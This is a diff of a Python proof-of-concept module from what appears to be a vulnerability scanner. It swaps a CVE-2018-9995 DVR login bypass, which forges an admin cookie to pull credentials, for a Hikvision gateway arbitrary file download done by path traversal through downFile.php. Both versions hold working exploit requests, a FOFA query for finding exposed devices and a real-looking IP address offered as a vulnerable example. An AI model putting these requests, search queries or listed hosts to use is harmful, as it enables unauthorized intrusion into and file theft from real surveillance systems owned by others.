@@ -17,33 +17,19 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "DVR登录绕过漏洞",                        # 漏洞名称
-        "VulnID" : "CVE-2018-9995",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "DVR",                     # 漏洞应用名称
-        "AppVersion" : """
-            Novo
-            CeNova
-            QSee
-            Pulnix
-            XVR 5 in 1 (title: "XVR Login")
-            Securus, - Security. Never Compromise !! -
-            Night OWL
-            DVR Login
-            HVR Login
-            MDVR Login
-        """,                  # 漏洞应用版本
+        "name" : "HIKVISION 视频编码设备接入网关 任意文件下载",                        # 漏洞名称
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "海康威视视频接入网关系统",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。
-            最初由阿根廷研究员发现，
-            通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，
-            DVR将以明文形式响应设备的管理员凭证
+            海康威视视频接入网关系统在页面/serverLog/downFile.php的参数fileName存在任意文件下载漏洞
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            title="DVR login"
+            title="视频编码设备接入网关"
         """,                     # fofa搜索语句
-        "example" : "http://78.188.181.221:85",                     # 存在漏洞的演示url，写一个就可以了
+        "example" : "http://211.137.239.52:7288",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
     }
 
@@ -56,13 +42,11 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/device.rsp?opt=user&cmd=list" # url自己按需调整
+        url = self.target + "/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php" # url自己按需调整
         
 
-        headers = {
-                    # "User-Agent":get_random_ua(),
-                    # "Connection":"close",
-                    "Cookie": "uid=admin",
+        headers = {"User-Agent":get_random_ua(),
+                    "Connection":"close",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
@@ -71,7 +55,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "{\"result\":" in req.text:#req.status_code == 200 and :
+            if "$file_name" in req.text and req.status_code == 200 :
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
